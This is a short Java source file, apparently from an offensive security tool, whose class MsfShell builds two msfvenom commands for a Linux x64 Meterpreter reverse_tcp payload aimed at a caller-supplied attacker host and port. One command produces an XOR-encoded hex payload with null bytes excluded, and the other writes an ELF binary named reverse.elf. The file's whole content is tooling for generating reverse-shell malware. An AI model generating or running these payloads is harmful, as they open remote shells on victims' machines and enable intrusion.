package com.swordHostDemo.controller;

import com.swordHostDemo.bean.VaulesBean;

/**
 * @date: 2022/12/27 20:24
 * @description:
 */
public class MsfShell extends VaulesBean {

    public static String MsfCommand(String lhost, String lport) {
        //linuxhex
        String linuxHex = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+lhost+ " LPORT="+lport+" -e x64/xor -b '\\x00' -f hex";
        String linuxElf = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+lhost+ " LPORT="+lport+" -f elf -o reverse.elf";

        return linuxHex +"\r\n"+ linuxElf;
    }


}
